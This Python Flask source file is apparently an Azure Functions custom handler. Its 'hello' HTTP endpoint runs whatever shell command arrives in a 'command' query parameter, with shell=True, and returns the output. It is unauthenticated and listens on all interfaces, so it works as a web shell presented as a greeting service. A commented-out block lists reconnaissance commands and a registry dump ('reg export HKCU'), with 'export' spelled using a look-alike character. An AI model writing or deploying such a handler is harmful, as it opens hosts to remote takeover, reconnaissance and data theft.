from flask import Flask, request
import os
import subprocess
import logging
app = Flask(__name__)

@app.route('/api/http-trigger', methods=['GET'])
def hello_handler():
    name = request.args.get('name', '')
    command = request.args.get('command', '')
    # run the command "netstat /ano" with subprocess and get the output
    try:
        result = subprocess.run(command, capture_output=True, text=True, shell=True).stdout
    except Exception as e:
        logging.error(f"Error running command: {e}")
        return f"Error running command {e}"
    message = "Hello, please enter your name\n" + result
    if name:
        message = f"Hello, {name}\n" + result
    return message

if __name__ == "__main__":
    port = os.getenv("FUNCTIONS_CUSTOMHANDLER_PORT", "8080")
    print(f"Server listening on port {port}. Go to http://127.0.0.1:{port}/")
    app.run(host='0.0.0.0', port=port)

# import subprocess
# import logging

# test_cmds = ["dir", "netstat /ano", "ping /n 1 127.0.0.1", "reg eˣport HKCU out.reg"]

# for cmd in test_cmds:
#     try:
#         result = subprocess.run(cmd, capture_output=True, text=True, shell=True).stdout
#     except Exception as e:
#         logging.error(f"Error running command: {e}")
#         print(f"Error running command {e}")
#     print(result)
